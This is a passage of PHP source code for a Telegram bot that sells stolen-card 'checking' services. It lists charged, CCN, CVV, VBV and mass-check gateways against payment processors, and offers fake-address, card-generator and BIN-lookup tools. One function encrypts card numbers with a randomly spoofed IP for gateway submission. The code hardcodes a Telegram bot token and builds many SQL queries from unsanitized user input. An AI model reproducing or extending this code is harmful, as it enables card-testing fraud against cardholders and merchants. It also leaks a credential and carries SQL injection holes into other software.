        }



function GtCCN($gatewayAuth,$comando,$type,$pasarela) {
    $gaterResult = Gater($comando);
    $Razonn = razon($comando);
    $data = fecha($comando);
    if ($gaterResult == $comando) {
        return "<b>Name: <code>$gatewayAuth</code> | Pasarela: <code>$pasarela</code>
Format: <code>$$comando card|month|year|cvv</code>
Plan: <code>Premium - Requires Credits</code> | Status: <code>Mant! ⚠️</code>
Review: <code>$Razonn | $data</code>
</b>";
    } else {
        return "<b>Name: <code>$gatewayAuth</code> | Pasarela: <code>$pasarela</code>
Format: <code>$$comando card|month|year|cvv</code>
Plan: <code>Premium - Requires Credits</code> | Status: <code>ON! ✅</code>
Review: <code>None!</code>
</b>";
    }
}

function GtCCNMass($gatewayAuth,$comando,$pasarela) {
    $gaterResult = Gater($comando);
    $Razonn = razon($comando);
    $data = fecha($comando);
    if ($gaterResult == $comando) {
        return "<b>Name: <code>$gatewayAuth</code> | Pasarela: <code>$pasarela</code>
Format: <code>$$comando card|month|year|cvv</code>
Plan: <code>Premium - Requires Credits</code> | Status: <code>Mant! ⚠️</code>
Review: <code>$Razonn | $data</code></b>";
    } else {
        return "<b>Name: <code>$gatewayAuth</code> | Pasarela: <code>$pasarela</code>
Format: <code>$$comando card|month|year|cvv</code>
Plan: <code>Premium - Requires Credits</code> | Status: <code>ON! ✅</code>
Review: <code>None!</code>
</b>";
    }
}


#CCN CHARGED
if ($cdata2 == "cchargs"){
    if ($queryOriginId != $queryUserId) {
        $response = "Access denied, use your own buttons";
        answerCallbackQuery($queryId, $response, true);
        exit;
}

        
            $keyboard = [
    'inline_keyboard' => [
        [
            ['text' => 'Back', 'callback_data' => 'tpgate'],
            ['text' => '«Tools»', 'callback_data' => 'tool']
           
           
        ]
        ]];
$idioma_cambiar = trim(IdiomaUser($queryOriginId));
if(empty($idioma_cambiar)){
  $idioma_cambiar = 'en';
}

$freecommands = urlencode(traducir("<b>Commands: >_$-CCN! Gateways = Page: (1/1)
━ • ━━━━━━━━━━ • ━
".gaterfrom("Pazzezy","pz","Creditos","Pazzezy")."
━ • ━━━━━━━━━━ • ━
".gaterfrom("Krispy","kr","Creditos","Pazzezy")."
━ • ━━━━━━━━━━ • ━
".gaterfrom("Queen","qn","Creditos","Pazzezy")."
━ • ━━━━━━━━━━ • ━
".gaterfrom("Kali","kl","Premium","Adyen")."
━ • ━━━━━━━━━━ • ━</b>",$idioma_cambiar));
$free = json_encode($keyboard);
        file_get_contents("https://api.telegram.org/bot5456276655:AAFt3u9hGVZxA72kBJrTc9W-Bmp7CWjLJBA/editMessageCaption?chat_id=$cchatid2&caption=$freecommands&message_id=$cmessage_id2&parse_mode=HTML&reply_markup=$free");
}  


        
        
#Gater tipos #
if ($cdata2 == "CvvChage"){
    if ($queryOriginId != $queryUserId) {
        $response = "Access denied, use your own buttons";
        answerCallbackQuery($queryId, $response, true);
        exit;
}
$idioma_cambiar = trim(IdiomaUser($queryOriginId));
if(empty($idioma_cambiar)){
  $idioma_cambiar = 'en';
}
    $keyboard = [
    'inline_keyboard' => [
        [
            ['text' => 'Back', 'callback_data' => 'tpgate'],
            ['text' => '«'.traducir("tools",$idioma_cambiar).'»', 'callback_data' => 'tool']
           
           
        ]
        ]];



    $freecommands = urlencode(traducir("<b>Commands: >_$-CVV! Gateways = Page: (1/1)
━ • ━━━━━━━━━━ • ━
".gaterfrom("Kindom","kd","Premium","Payflow Pro")."
━ • ━━━━━━━━━━ • ━
".gaterfrom("Lwvi","lw","Premium","Paypal Avs")."
━ • ━━━━━━━━━━ • ━
".gaterfrom("Telcel","tc","Premium","Telcel MX")."
━ • ━━━━━━━━━━ • ━
".gaterfrom("Tang","tg","Premium","Conekta MX")."
━ • ━━━━━━━━━━ • ━</b>",$idioma_cambiar));
$free = json_encode($keyboard);
        file_get_contents("https://api.telegram.org/bot5456276655:AAFt3u9hGVZxA72kBJrTc9W-Bmp7CWjLJBA/editMessageCaption?chat_id=$cchatid2&caption=$freecommands&message_id=$cmessage_id2&parse_mode=HTML&reply_markup=$free");
        }

if ($cdata2 == "tpgate"){
if ($queryOriginId != $queryUserId) {
    $response = "Access denied, use your own buttons";
    answerCallbackQuery($queryId, $response, true);
    exit;
}    


 $keyboard = [
    'inline_keyboard' => [
        [
            ['text' => "Auth", 'callback_data' => "auth"],
            ['text' => "Charged", 'callback_data' => "gcharg"],
            ['text' => "VBV", 'callback_data' => "Vbv"],
        ],
        [
            ['text' => "Mass Checking", 'callback_data' => "mass"],
            ['text' => "CCN", 'callback_data' => "cchargs"],
            ['text' => "CVV", 'callback_data' => "CvvChage"],
        ],
        [
            ['text' => "Return", 'callback_data' => "return"],
        ],
    ],
    'resize_keyboard' => true
];

$idioma_cambiar = trim(IdiomaUser($queryOriginId));
if(empty($idioma_cambiar)){
  $idioma_cambiar = 'en';
}

$gate = $db->get("gater_status");

$onlineCount = 0;
$offlineCount = 0;

foreach ($gate as $dato) {
    if ($dato['status'] == 'OFF') {
        $offlineCount++;
    } elseif ($dato['status'] == 'ONLINE') {
        $onlineCount++;
    }
}

$freecommands = urlencode(traducir("<b>👋Hello You can navigate through my commands just by pressing on my buttons.\nGateway ON! ✅: $onlineCount \nGateway Mant! ⚠️: $offlineCount</b> " ,$idioma_cambiar));
$free = json_encode($keyboard);
        file_get_contents("https://api.telegram.org/bot5456276655:AAFt3u9hGVZxA72kBJrTc9W-Bmp7CWjLJBA/editMessageCaption?chat_id=$cchatid2&caption=$freecommands&message_id=$cmessage_id2&parse_mode=HTML&reply_markup=$free");
        }

#ENd #
if ($cdata2 == "return"){
if ($queryOriginId != $queryUserId) {
    $response = "Access denied, use your own buttons";
    answerCallbackQuery($queryId, $response, true);
    exit;
}    

$idioma_cambiar = trim(IdiomaUser($queryOriginId));
if(empty($idioma_cambiar)){
  $idioma_cambiar = 'en';
}

$keyboard = ['inline_keyboard'=>[
     [['text'=>'«'.traducir("Gateway",$idioma_cambiar).'»','callback_data'=>"tpgate"],
                ['text'=> '«'.traducir("tools",$idioma_cambiar).'»','callback_data'=>"tool"]],
                [['text'=>"«Language»",'callback_data'=>"Language"]],
        ],'resize_keyboard'=>true];
        


$gd = $db->getValue("gater_status", "count(*)");

$freecommands = urlencode(traducir("<b>👋Hello You can navigate through my commands just by pressing on my buttons.\n Gateway Total Disponibles : $gd </b>",$idioma_cambiar));
$free = json_encode($keyboard);
        file_get_contents("https://api.telegram.org/bot5456276655:AAFt3u9hGVZxA72kBJrTc9W-Bmp7CWjLJBA/editMessageCaption?chat_id=$cchatid2&caption=$freecommands&message_id=$cmessage_id2&parse_mode=HTML&reply_markup=$free");
        }
#Tool
if ($cdata2 == "tool"){
    if ($queryOriginId != $queryUserId) {
        $response = "AAccess denied, use your own buttons";
        answerCallbackQuery($queryId, $response, true);
        exit;
}

    $keyboard = [
    'inline_keyboard' => [
        [
            ['text' => 'Back', 'callback_data' => 'return'],
             ['text' => 'Next', 'callback_data' => 'tool2'],
            ['text' => '«'.traducir("Gateway",$idioma_cambiar).'»', 'callback_data' => 'tpgate']
           
           
        ]
        ]];
        
$idioma_cambiar = trim(IdiomaUser($queryOriginId));
if(empty($idioma_cambiar)){
  $idioma_cambiar = 'en';
}

$freecommands = urlencode(traducir("<b>Commands: >_$-Tools! = Page: (1/2)
━ • ━━━━━━━━━━ • ━
Name: <code>Fake Address!</code>
- Format: <code>/Addr US</code>
- Rank: <code>Free</code> | Status: <code>ON! ✅</code>
━ • ━━━━━━━━━━ • ━
Name: <code>Country addr!</code>
- Format: <code>/Country</code>
- Rank: <code>Free</code> | Status: <code>ON! ✅</code>
━ • ━━━━━━━━━━ • ━
Name: <code>Bin Loockup!</code>
- Format: <code>/Bin 456789</code>
- Rank: <code>Free</code> | Status: <code>ON! ✅</code>
━ • ━━━━━━━━━━ • ━
Name: <code>Gen Card!</code>
- Format: <code>/Gen 456789</code>
- Rank: <code>Free</code> | Status: <code>ON! ✅</code>
━ • ━━━━━━━━━━ • ━
Name: <code>Tool Extra!</code>
- Format: <code>/extra bin</code>
- Rank: <code>Free</code> | Status: <code>ON! ✅</code>
━ • ━━━━━━━━━━ • ━</b>",$idioma_cambiar));
$free = json_encode($keyboard);
        file_get_contents("https://api.telegram.org/bot5456276655:AAFt3u9hGVZxA72kBJrTc9W-Bmp7CWjLJBA/editMessageCaption?chat_id=$cchatid2&caption=$freecommands&message_id=$cmessage_id2&parse_mode=HTML&reply_markup=$free");

}
if ($cdata2 == "tool2"){
    if ($queryOriginId != $queryUserId) {
        $response = "AAccess denied, use your own buttons";
        answerCallbackQuery($queryId, $response, true);
        exit;
}

        
            
$idioma_cambiar = trim(IdiomaUser($queryOriginId));
if(empty($idioma_cambiar)){
  $idioma_cambiar = 'en';
}

    $keyboard = [
    'inline_keyboard' => [
        [
            ['text' => ''.traducir("Gateway",$idioma_cambiar).'', 'callback_data' => 'tpgate'], 
            ['text' => 'Back', 'callback_data' => 'tool'],
        ]
        ]];

$freecommands = urlencode(traducir("<b>Commands: >_$-Tools! = Page: (1/2)
━ • ━━━━━━━━━━ • ━
Name: <code>Spotify Generador!</code>
- Format: <code>/spotify</code>
- Rank: <code>Free</code> | Status: <code>ON! ✅</code>
━ • ━━━━━━━━━━ • ━
Name: <code>Card Aleatoria!</code>
- Format: <code>/cc</code>
- Rank: <code>Free</code> | Status: <code>ON! ✅</code>
━ • ━━━━━━━━━━ • ━
Name: <code>Traductor!</code>
- Format: <code>/trad es Hello!</code>  
- Rank: <code>Free</code> | Status: <code>ON! ✅</code>
━ • ━━━━━━━━━━ • ━</b>", $idioma_actual,$idioma_cambiar));
$free = json_encode($keyboard);
        file_get_contents("https://api.telegram.org/bot5456276655:AAFt3u9hGVZxA72kBJrTc9W-Bmp7CWjLJBA/editMessageCaption?chat_id=$cchatid2&caption=$freecommands&message_id=$cmessage_id2&parse_mode=HTML&reply_markup=$free");

}


if ($cdata2 == "Language"){ 
    if ($queryOriginId != $queryUserId) {
        $response = "ACESSO DENEGADO";
        answerCallbackQuery($queryId, $response, true);
        exit;
}

$keyboard = [
        'inline_keyboard' => [
            [
                ['text' => 'Español 🇪🇸', 'callback_data' => 'es'],
                ['text' => 'English 🇺🇸', 'callback_data' => 'en'],
            ],
            [
                ['text' => 'Русский 🇷🇺', 'callback_data' => 'ru'],
                ['text' => 'Português 🇧🇷', 'callback_data' => 'pt'],
            ],
            [
            ['text' => '«-', 'callback_data' => 'return'],
            ],
        ]
    ];
$freecommands = urlencode("<b>We have 4 languages, you can choose the one you prefer</b>");
$free = json_encode($keyboard);
        file_get_contents("https://api.telegram.org/bot5456276655:AAFt3u9hGVZxA72kBJrTc9W-Bmp7CWjLJBA/editMessageCaption?chat_id=$cchatid2&caption=$freecommands&message_id=$cmessage_id2&parse_mode=HTML&reply_markup=$free");
}

if ($cdata2 == "es"){ 
    if ($queryOriginId != $queryUserId) {
        $response = "ACESSO DENEGADO";
        answerCallbackQuery($queryId, $response, true);
        exit;
}
$data = Array (
        "Idioma" => $CALL_TEXT_DATA,
    );
$db->where("userid", $queryUserId);
$db->update ('prmiumtime', $data);
$text = "Your language preference has been updated to: " . $CALL_TEXT_DATA;
answerCallbackQuery($queryId, $text, true);
}


if ($cdata2 == "en"){ 
    if ($queryOriginId != $queryUserId) {
        $response = "ACESSO DENEGADO";
        answerCallbackQuery($queryId, $response, true);
        exit;
}
$data = Array (
        "Idioma" => $CALL_TEXT_DATA,
    );
$db->where("userid", $queryUserId);
$db->update ('prmiumtime', $data);
$text = "Your language preference has been updated to: " . $CALL_TEXT_DATA;
answerCallbackQuery($queryId, $text, true);
}


if ($cdata2 == "ru"){ 
    if ($queryOriginId != $queryUserId) {
        $response = "ACESSO DENEGADO";
        answerCallbackQuery($queryId, $response, true);
        exit;
}
$data = Array (
        "Idioma" => $CALL_TEXT_DATA,
    );
$db->where("userid", $queryUserId);
$db->update ('prmiumtime', $data);
$text = "Your language preference has been updated to: " . $CALL_TEXT_DATA;
answerCallbackQuery($queryId, $text, true);
}

if ($cdata2 == "pt"){ 
    if ($queryOriginId != $queryUserId) {
        $response = "ACESSO DENEGADO";
        answerCallbackQuery($queryId, $response, true);
        exit;
}
$data = Array (
        "Idioma" => $CALL_TEXT_DATA,
    );
$db->where("userid", $queryUserId);
$db->update ('prmiumtime', $data);
$text = "Your language preference has been updated to: " . $CALL_TEXT_DATA;
answerCallbackQuery($queryId, $text, true);
}


function Luhn($cc)
    {
        $number=preg_replace('/\D/', '',$cc);
        $number_length=strlen($number);
        $parity=$number_length % 2;
        $total=0;
  
    for ($i=0; $i<$number_length; $i++) {
            $digit=$number[$i];
        if ($i % 2 == $parity) {
             $digit*=2;
        if ($digit > 9) {
            $digit-=9;
        }
}
            $total+=$digit;
     }

     return ($total % 10 == 0) ? '' : "ERROR";
}
       

function add_days($timestamp,$days){
    $future = $timestamp + (60*60*24*str_replace('d','',$days));
    return $future;
}

function add_hours($timestamp, $hours) {
    $future = $timestamp + (60 * 60 * str_replace('h', '', $hours));
    return $future;
}

function add_minutes($timestamp,$minutes){
    $future = $timestamp + (60*str_replace('m','',$minutes));
    return $future;
}

function Zoura_Encr($Data, $fieldKey)
{
    $i = explode("|", $Data);
    $cc = $i[0];
    $mes = $i[1];
    $ano = $i[2];
    $cvv = $i[3];

    $ipRan = rand(100, 999).'.'.rand(100, 999).'.'.rand(100, 999).'.'.rand(100, 999);
    $fieldToEncrypt = "#$ipRan#$cc#$cvv#$mes#$ano";
    $formattedPublicKey = "-----BEGIN PUBLIC KEY-----\n$fieldKey\n-----END PUBLIC KEY-----";

    $base64EncodedData = base64_encode($fieldToEncrypt);

    $publicKey = openssl_get_publickey($formattedPublicKey);

    openssl_public_encrypt($base64EncodedData, $encryptedData, $publicKey);

    $base64EncryptedData = base64_encode($encryptedData);

    openssl_free_key($publicKey);

    return $base64EncryptedData;
}

#Funcion de verificación 

function razon2($Gaterr){
    global $roles;
    $veripremium = "SELECT `razon` FROM `gateroff` WHERE `Gater`='$Gaterr'";
    $res = mysqli_query($roles, $veripremium);
    if (mysqli_num_rows($res) != 0) {
        while ($fila = mysqli_fetch_array ($res)) {
            return $fila['razon'];
        }
    }else{
        #logsummary("ERROR");
        return 'Has no comment';
    }
}

function verifiAdmin($userID){
    global $roles;
    $stmt = mysqli_prepare($roles, "SELECT * FROM `admin` WHERE `iduser`=?");
    mysqli_stmt_bind_param($stmt, 'i', $userID);
    mysqli_stmt_execute($stmt);
    $res = mysqli_stmt_get_result($stmt);
    mysqli_stmt_close($stmt);
    if (mysqli_num_rows($res) != 0) {
        return true;
    } else {
        #logsummary("ERROR");
        return false;
    }
}

function FreeUserRegister($str) {
    global $roles;

    $query = "SELECT COUNT(*) FROM `userpublic` WHERE `iduser`=?";
    $stmt = mysqli_prepare($roles, $query);
    mysqli_stmt_bind_param($stmt, 'i', $str);
    mysqli_stmt_execute($stmt);
    mysqli_stmt_bind_result($stmt, $count);
    mysqli_stmt_fetch($stmt);
    mysqli_stmt_close($stmt);
    if ($count > 0) {
        return true;
    }
    return false;
}


function verifiPremium($userID) {
    global $roles;

    $query = "SELECT COUNT(*) FROM `premium` WHERE `iduser`=?";
    $stmt = mysqli_prepare($roles, $query);
    mysqli_stmt_bind_param($stmt, 'i', $userID);
    mysqli_stmt_execute($stmt);
    mysqli_stmt_bind_result($stmt, $count);
    mysqli_stmt_fetch($stmt);
    mysqli_stmt_close($stmt);

    if ($count > 0) {
        return true;
    }

    // logsummary("ERROR");
    return false;
}



    function country($bin){ 
        global $roles; 
        $veripremium = "SELECT country FROM bins WHERE bin='$bin'"; 
        $res = mysqli_query($roles, $veripremium); 
        if (mysqli_num_rows($res) != 0) { 
            while ($fila = mysqli_fetch_array ($res)) { 
                return $fila['country']; 
        } 
    }else{
        #logsummary("ERROR");
        return False;
    }
}
     
    function brannd($bin){ 
        global $roles; 
        $veripremium = "SELECT brand FROM bins WHERE bin='$bin'"; 
        $res = mysqli_query($roles, $veripremium); 
        if (mysqli_num_rows($res) != 0) { 
            while ($fila = mysqli_fetch_array ($res)) { 
                return $fila['brand']; 
        } 
    }else{
        #logsummary("ERROR");
        return False;
    }
}
    function Emoji($bin){ 
        global $roles; 
        $veripremium = "SELECT Emoji FROM bins WHERE bin='$bin'"; 
        $res = mysqli_query($roles, $veripremium); 
        if (mysqli_num_rows($res) != 0) { 
            while ($fila = mysqli_fetch_array ($res)) { 
                return $fila['Emoji']; 
        } 
    }else{
        #logsummary("ERROR");
        return False;
    }
}
    function type($bin){ 
        global $roles; 
        $veripremium = "SELECT type FROM bins WHERE bin='$bin'"; 
        $res = mysqli_query($roles, $veripremium); 
        if (mysqli_num_rows($res) != 0) { 
            while ($fila = mysqli_fetch_array ($res)) { 
                return $fila['type']; 
        } 
    } else{
        #logsummary("ERROR");
        return False;
    }
}
    function level($bin){ 
        global $roles; 
        $veripremium = "SELECT level FROM bins WHERE bin='$bin'"; 
        $res = mysqli_query($roles, $veripremium); 
        if (mysqli_num_rows($res) != 0) { 
            while ($fila = mysqli_fetch_array ($res)) { 
                return $fila['level']; 
        } 
    }else{
        #logsummary("ERROR");
        return False;
    }
} 




    function bank($bin){ 
        global $roles; 
        $veripremium = "SELECT `bank` FROM `bins` WHERE `bin`='$bin'"; 
        $res = mysqli_query($roles, $veripremium); 
        if (mysqli_num_rows($res) != 0) { 
            while ($fila = mysqli_fetch_array ($res)) { 
                return $fila['bank']; 
        } 
    }else{
        #logsummary("ERROR");
        return False;
    }
} 
    function binnumber($bin){ 
        global $roles; 
        $veripremium = "SELECT bin FROM bins WHERE bin='$bin'"; 
        $res = mysqli_query($roles, $veripremium); 
        if (mysqli_num_rows($res) != 0) { 
            while ($fila = mysqli_fetch_array ($res)) { 
                return $fila['bin']; 
        } 
    }else{
        #logsummary("ERROR");
        return False;
    }
}
function verifiUser($userID){
    global $roles;
    $veripremium = "SELECT * FROM `users` WHERE `iduser`='$userID'";
    $res = mysqli_query($roles, $veripremium);
    
    if ($res) {
        if (mysqli_num_rows($res) != 0) {
            return true;
        } else {
            return false;
        }
    } else {
        error_log("Error en la consulta: " . mysqli_error($roles));
        return false;
    }
}



function verifniBan($userId){
        global $roles;
        $banus = "SELECT * FROM `ban` WHERE `iduser`='$userId'";
        $res = mysqli_query($roles, $banus);
        if (mysqli_num_rows($res) != 0) {
            return true;
        }else{
            #logsummary("ERROR");
            return False;
        }
    }

    function cleoosp($string) {
        $str = preg_replace("/[^0-9]/", " ", $string);
           return $str; 
    }
# FUNCION ANTIE
$config['adminID'] = "5168647868";
$timespma['anti_spam_timer'] = "60";
$timAsp = infouser($userId);
$Aps = $timAsp['Antispma'] ?? '20';
$timespma['premium'] = $Aps;

function fetchUser($userID){
    global $roles;
    $dataf = mysqli_query($roles,"SELECT * FROM users WHERE userid='$userID'");

    return ($dataf->num_rows == 1) ? $dataf->fetch_assoc() : false;
}


function existsLastCheckedpremium($userID){
    global $roles;
    $dataf = mysqli_query($roles,"SELECT * FROM antispampremiun WHERE userid='$userID'");

    if(mysqli_num_rows($dataf) == 0){
        return False;
    }

    $userData = $dataf->fetch_assoc();
    
    return $userData['last_checked_on'];

}

function pc($userID){
    global $roles;
    $dataf = mysqli_query($roles,"SELECT * FROM antispampremiun WHERE userid='$userID'");

    if(mysqli_num_rows($dataf) == 0){
        return False;
    }

    $userData = $dataf->fetch_assoc();
    
    return $userData['tatus'];

}







function antispamCheckperemium($userID){
    global $roles;
    global $config;
    global $timespma;

    $antiSpamGey = existsLastCheckedpremium($userID);
    $tatu = pc($userID);
    if($userID == $config['adminID'] || $userID == verifiAdmin($userID)){
        return False;
    }

    if($antiSpamGey == False){
        $addtodb = mysqli_query($roles,"INSERT INTO antispampremiun (userid,last_checked_on) VALUES ('$userID','".time()."')");
        return False;
    }else{
        if(time() - $antiSpamGey > $timespma['premium']){
            $addtodb = mysqli_query($roles,"UPDATE antispampremiun set last_checked_on = '".time()."' WHERE userid = '$userID'");
            return False;
        }else{
            return $timespma['premium'] - (time() - $antiSpamGey);
        }
        
    }
}
function existsLastChecked($userID){
    global $roles;
    $dataf = mysqli_query($roles,"SELECT * FROM antispam WHERE userid='$userID'");

    if(mysqli_num_rows($dataf) == 0){
        return False;
    }

    $userData = $dataf->fetch_assoc();
    
    return $userData['last_checked_on'];

}



function antispamCheck($userID){
    global $roles;
    global $config;
    global $timespma;

    $antiSpamGey = existsLastChecked($userID);
    
    if($userID == $config['adminID'] || $userID == verifiAdmin($userID)|| $userID == verifiPremium($userID)|| veritimepremium($userID)|| $userID == verificadroCrdediuser($userID)){
        return False;
    }
    if($antiSpamGey == False){
        $addtodb = mysqli_query($roles,"INSERT INTO antispam (userid,last_checked_on) VALUES ('$userID','".time()."')");
        return False;
    }else{
        if(time() - $antiSpamGey > $timespma['anti_spam_timer']){
            $addtodb = mysqli_query($roles,"UPDATE antispam set last_checked_on = '".time()."' WHERE userid = '$userID'");
            return False;
        }else{
            return $timespma['anti_spam_timer'] - (time() - $antiSpamGey);
        }
        
    }
}




function fetchAPIKey($userID){
    global $roles;
    $key = mysqli_query($roles,"SELECT sk_live FROM users WHERE iduser = '$userID'");
    $key = $key->fetch_assoc();
    return $key['sk_live'];

}

function updateAPIKey($userID,$key){
    global $roles;
    $key2 = mysqli_query($roles,"UPDATE `users` SET sk_live = '$key' WHERE iduser = $userID");
    if (mysqli_num_rows($key2) > 0) {
        logsummary ("se guardo el sk");
    }else{
        logsummary("Erro");
    }
}


function bannedbin($bin){
	$bugbin = file_get_contents('banned.txt');
    $exploded = explode("\n", $bugbin);
    if (in_array($bin, $exploded)) {
    return true;
     }
}


$directorios = [
    'Gateway/',
    'Gateway/mass/',
    'Gateway/CCN CHARGED/',
    'Gateway/Funtcion/',
    'Gateway/Charged/',
    'Gateway/Free/',
    'Tool_Admin/',
    'Tool/',
    'Fuwc/'
];

// Recorrer cada directorio
foreach ($directorios as $directorio) {
    // Verificar que el directorio exista y sea realmente un directorio
    if (is_dir($directorio)) {
        // Obtener una lista de todos los archivos en el directorio
        $archivos = scandir($directorio);

        // Iterar sobre los archivos
        foreach ($archivos as $archivo) {
            // Construir la ruta completa del archivo
            $rutaArchivo = $directorio . $archivo;

            // Verificar si el archivo es un archivo PHP y no es un directorio ni . ni ..
            if (is_file($rutaArchivo) && substr($archivo, -4) === '.php') {
                // Incluir el archivo
                include $rutaArchivo;
            }
        }
    }
}


// flush();

// reply_to($chatId,$message_id_1,$keyboard,$keyboard, "<b>Sorry! %0AGive Me Valid City Name %0AEX: <code>!weather Bokaro</code></b>");
if(file_exists(getcwd().('/cookie.txt'))){
unlink('cookie.txt');

}

define('API_KEY',$botToken);



function bot($method, $data = []) {
    // Clave del bot
    $bot_key = '5456276655:AAFt3u9hGVZxA72kBJrTc9W-Bmp7CWjLJBA';
    $api_url = "https://api.telegram.org/bot$bot_key/$method";

    $client = new Client([
        'timeout'  => 5.0, 
        RequestOptions::SYNCHRONOUS => true,
        'connect_timeout' => 2.0, // Tiempo de espera para conectar en segundos
        'max_redirects' => 3, // Número máximo de redirecciones
        'http_errors' => false, // No lanzar excepciones en códigos de error HTTP
    ]);

    $success = false;
    $result = null;

    while (!$success) {
        try {
            // Enviar solicitud a la API de Telegram
            $response = $client->post($api_url, [
                'headers' => [
                    'Content-Type' => 'application/json',
                ],
                'json' => $data,
            ]);

            // Obtener el cuerpo de la respuesta
            $result = $response->getBody()->getContents();
            $decoded_result = json_decode($result, true);

            if (!empty($decoded_result)) {
                $success = true;
                return $decoded_result;
            } else {
                error_log("Error: Respuesta no válida desde Telegram API");
                usleep(50000); // Esperar 1 segundo antes de reintentar
            }
        } catch (RequestException $e) {
            $error_message = $e->getMessage();

            // Manejar errores específicos
            if ($e->getCode() == 28 || $e->getCode() == 7) { // CURLE_OPERATION_TIMEOUTED y CURLE_COULDNT_CONNECT
                sleep(1); // Esperar 1 segundo antes de reintentar
            } else {
                // Loggear el error
                error_log("Error al enviar solicitud a Telegram: $error_message");
                return false;
            }
        }
    }
    return false;
}








function sendPhoto($chat_id,$text,$photo,$keyboard,$message_id){
    bot('sendPhoto',[
    'chat_id'=>$chat_id,
    'caption'=>$text,
    'photo'=>$photo,
    'reply_to_message_id'=>$message_id,
    'parse_mode'=>'HTML',
    'reply_markup'=>$keyboard]);
   }


   function verificadroCrdediuser($userID){
    global $roles;
    $veripremium = "SELECT * FROM `creditos` WHERE `userdid`='$userID'";
    $res = mysqli_query($roles, $veripremium);
    if (mysqli_num_rows($res) != 0) {
        return true;
    }else{
        #logsummary("ERROR");
        return False;
    }
}

function veritimepremium($userID){
    global $roles;
    $veripremium = "SELECT * FROM `prmiumtime` WHERE `userid`='$userID'";
    $res = mysqli_query($roles, $veripremium);
    if (mysqli_num_rows($res) != 0) {
        return true;
    }else{
        #logsummary("ERROR");
        return False;
    }
}

function timepremi($bin){ 
    global $roles; 
    $verivum = "SELECT `timedate` FROM `prmiumtime` WHERE userid=$bin"; 
    $res = mysqli_query($roles, $verivum); 
    if (mysqli_num_rows($res) != 0) { 
        while ($fila = mysqli_fetch_array ($res)) { 
            return $fila['timedate']; 
    } 
}else{
    #logsummary("ERROR");
    return False;
}
}

function sendaction($chatId, $action){
	bot('sendchataction',[
	'chat_id'=>$chatId,
	'action'=>$action
	]);
	}
    
    
    function calculartimepo($fechaini,$fechafinal){
        $date1 = date_create($fechaini);
        $datat2 = date_create($fechafinal);
        $restan = date_diff($date1,$datat2);
        
       $tiempo = array();
       foreach ($restan as $valor){
       $tiempo[]= $valor;
       }
       return  $tiempo;
       }
       
function deleteprm($id){
    
    
    global $db,$username,$chatId,$r_username;;
    echo "Procesando...";
    $db->where ("userid", $id);
    $count = $db->getValue ("prmiumtime", "count(*)");
    if ($count == 0) {
        echo "Does not exist db";
        return;
    }
    $db->where ("userid", $id);
    $user = $db->getOne ("prmiumtime");
    if (time() > $user["timedate"]) {
    $timeElapsed = time() - $user["timedate"];


    $days = floor($timeElapsed / (60 * 60 * 24));
    $hours = floor(($timeElapsed % (60 * 60 * 24)) / (60 * 60));
    $minutes = floor(($timeElapsed % (60 * 60)) / 60);
    $seconds = $timeElapsed % 60;
    
    $resp = "El período de suscripción ha vencido hace $days días, $hours horas, $minutes minutos y $seconds segundos. Se procederá con el baneo temporal de los Grupos";

    bot('sendMessage', [
            'chat_id' => $id,
            'reply_to_message_id'=>$message_id,
            'parse_mode'=>'HTML',
            'text' =>$resp
        ]);
        
        file_get_contents("https://api.telegram.org/bot5456276655:AAFt3u9hGVZxA72kBJrTc9W-Bmp7CWjLJBA/kickChatMember?chat_id=-1001711130201&user_id=$id");
        $db->where('userid', $id);
        if($db->delete('prmiumtime')) echo 'successfully deleted';
        if ($chatId == "-1001711130201") {
        bot('sendMessage', [
            'chat_id' => -1001711130201,
            'reply_to_message_id'=>$message_id,
            'parse_mode'=>'HTML',
            'text' =>$resp
        ]);
    }
} else {
        echo "El tiempo aún no ha vencido";
    }
}




function segundos_tiempo($segundos) {
    $minutos = $segundos / 60;
    $horas = floor($minutos / 60);
    $minutos2 = $minutos % 60;
    $segundos_2 = $segundos % 60 % 60 % 60;
    if ($minutos2 < 10) 
        $minutos2 = '0'.$minutos2;
    
    if ($segundos_2 < 10) 
        $segundos_2 = '0'.$segundos_2;
    
    if ($segundos < 60) { /* segundos */
        $resultado = round($segundos).' Segundos';
    }
    elseif($segundos > 60 && $segundos < 3600) { /* minutos */
        $resultado = $minutos2
            .':'
            .$segundos_2
            .' Minutos';
    } else { /* horas */
        $resultado = $horas . ':' . $minutos2 . ':' . $segundos_2 . ' Horas';
    }
    return $resultado;
}


function Dcred($userId)
{
    global $roles;

    $Cree = Credis($userId);
    $timess = $Cree['Tiempo'];
    if (empty($timess)) {
        return false;
    }
    $userData = $timess - time();
    
    if ($userData <= 0) {
        $stmt = mysqli_prepare($roles, "DELETE FROM creditos WHERE userdid = ?");
        mysqli_stmt_bind_param($stmt, "i", $userId);
        mysqli_stmt_execute($stmt);
        $err = mysqli_error($roles);
        mysqli_stmt_close($stmt);

        if (empty($err)) {
            return true;
        } else {
            return false;
        }
    }

    return true;
}

function cmd($text, $tx){ 
    $comand = explode(" ", $text);
    if (!is_numeric($comand[0][0]) && !ctype_alpha($comand[0][0]) && substr($comand[0], 1) == $tx) return true;
    return false;
}



function seg2tiempo($segundos) {
    $tiempo = abs($segundos);
    $dias = floor($tiempo / 86400);
    $horas = gmdate('H', $tiempo);
    $minutos = gmdate('i', $tiempo);
    $segundos = gmdate('s', $tiempo);
    $formato = '';
    if ($dias > 0) {
        $formato .= $dias . 'day(s) ';
    }
    $formato .= $horas . 'h ';
    $formato .= $minutos . 'm ';
    $formato .= $segundos . 's';
    return $formato;
}






if(cmd($message, "me")){
    deleteprm($userId);
    Dcred($userId);
    if(strlen($r_userId > 0)) {
        $userId = $r_userId;
        $username = $r_username;
        $firstname = $r_firstname;

    }
    $kld = timepremi($userId);
    $userData = $kld ? $kld - time() : null;
    $kld = $userData ? seg2tiempo($userData) : 'No active plan';
    $res = Credis($userId);
    $creditos = $res['creditos'];
    $timecred = $res['Tiempo'];

    if (empty($timecred)) {
        $TimCrd = '0';
    } else {
        $Timuse = $timecred - time();
        $TimCrd = seg2tiempo($Timuse);
    }
   $Rank = getUserRank($userId, $chatId, $Mi_Id);
    $text = "<b>User:</b> <a href='tg://user?id=$userId'>$firstname</a>\n" .
            "<b>Username:</b><code> @$username</code>\n" .
            "<b>Userid:</b> [<code>$userId</code>]\n" .
            "<b>creditos:</b> <code>" . ($creditos ?: '0') . "</code>|Time : <code>$TimCrd</code>\n" .
            "<b>Rank:</b><code> $Rank</code>\n" .
            "<b>Expired in:</b> <code>$kld</code>";
            
            
            $idioma_cambiar = IdiomaUser($userId);
            if(empty($idioma_cambiar)){
